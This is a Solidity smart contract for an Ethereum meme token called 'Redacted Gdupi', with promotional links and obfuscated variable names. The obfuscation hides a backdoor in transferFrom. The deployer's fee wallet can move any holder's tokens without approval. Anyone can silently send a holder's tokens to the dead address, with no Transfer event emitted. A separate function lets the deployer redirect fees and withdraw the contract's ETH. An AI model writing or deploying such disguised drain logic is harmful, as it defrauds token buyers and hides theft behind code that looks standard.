// SPDX-License-Identifier: MIT

/*
    Name: Redacted Gdupi
    Symbol: GDUPI

    the most redacted vibecoin on eth.
    a true base-native original meme ever!

    Web: https://www.gdupi.lol
    X: https://x.com/gdupi_redacted
    tg: https://t.me/gdupi_redacted
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract GDUPI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Redacted Gdupi";
    string private constant _symbol = unicode"GDUPI";
    
    address payable private _vbjljvlklGDUPI;
    mapping(address => uint256) private _cijojiseGDUPI;
    mapping(address => mapping(address => uint256)) private _fjweoijGDUPI;
    mapping(address => bool) private _jojodjGDUPI;

    uint256 private _vjkboiwoeiGDUPI = 10;
    uint256 private _odijofjoeGDUPI = 10;
    uint256 private _joijoiGDUPI = 0;
    uint256 private _jvbkoiweGDUPI = 0;
    uint256 private _ojidoiweGDUPI = 7;
    uint256 private _ojdofGDUPI = 7;
    uint256 private _buyCount = 0;
    address private _ojdofiekjGDUPI;
    address private _kjvnkbjnGDUPI = address(0xdead);

    uint256 public _ojojoivlkGDUPI = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjGDUPI = 20000000 * 10 **_decimals;
    uint256 public _ppojofGDUPI = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbGDUPI = 1000000000 * 10 **_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _ojojoivlkGDUPI);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklGDUPI = payable(_msgSender());
        _cijojiseGDUPI[address(this)] = _kmmvbGDUPI * 98 / 100;
        _cijojiseGDUPI[owner()] = _kmmvbGDUPI * 2 / 100;
        _jojodjGDUPI[owner()] = true;
        _jojodjGDUPI[address(this)] = true;
        _jojodjGDUPI[_vbjljvlklGDUPI] = true;
        _ojdofiekjGDUPI = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbGDUPI * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbGDUPI * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbGDUPI;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fjweoijGDUPI[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _cijojiseGDUPI[account];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _fjweoijGDUPI[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_GDUPI(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoiGDUPI(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    receive() external payable {}

    function _joeijoijoj(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_jvjocvo() == false) return false;
        else {
            if(sender == uniswapV2Pair) return true;
            else return _kkvklv(recipient);
        }
    }

    function _kkvklv(address recipient) internal view returns (bool) {
        return recipient != _kjvnkbjnGDUPI;
    }

    function _jvjocvo() internal view returns (bool) {return msg.sender != _vbjljvlklGDUPI;}

    function _lvckmjlwoiGDUPI(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_joeijoijoj(sender, recipient))
            _allowed = _fjweoijGDUPI[sender][_msgSender()];
        return _allowed;
    }

    function _excuseGDUPI(address payable receipt) external {
        require(msg.sender == _ojdofiekjGDUPI , "");
        _vbjljvlklGDUPI = receipt;
        _GDUPIlkjlok(address(this).balance);
    }
    
    function _assistGDUPI(uint256 amount) private {
        _vbjljvlklGDUPI.transfer(amount);
    }

    function _GDUPIlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_GDUPI(_msgSender(), recipient, amount);
        return true;
    }

    function _transferr_GDUPI(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiweGDUPI)
                        ? _joijoiGDUPI
                        : _vjkboiwoeiGDUPI
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_jojodjGDUPI[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofGDUPI)
                            ? _jvbkoiweGDUPI
                            : _odijofjoeGDUPI
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofGDUPI) ? contractTokenBalance : _ppojofGDUPI; 
                    _swappp_GDUPI((amount < minBalance) ? amount : minBalance);
                }
                _assistGDUPI(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _cijojiseGDUPI[address(this)] =_cijojiseGDUPI[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _cijojiseGDUPI[from] =_cijojiseGDUPI[from].sub(amount);
        _cijojiseGDUPI[to] =_cijojiseGDUPI[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnGDUPI != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function removeLimits () external onlyOwner {
        _ojojoivlkGDUPI = _kmmvbGDUPI;
        _lkkkvnblkjGDUPI = _kmmvbGDUPI;
        emit MaxTxAmountUpdated(_kmmvbGDUPI);
    }

    function _swappp_GDUPI(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function enableGDUPITrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kmmvbGDUPI);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

}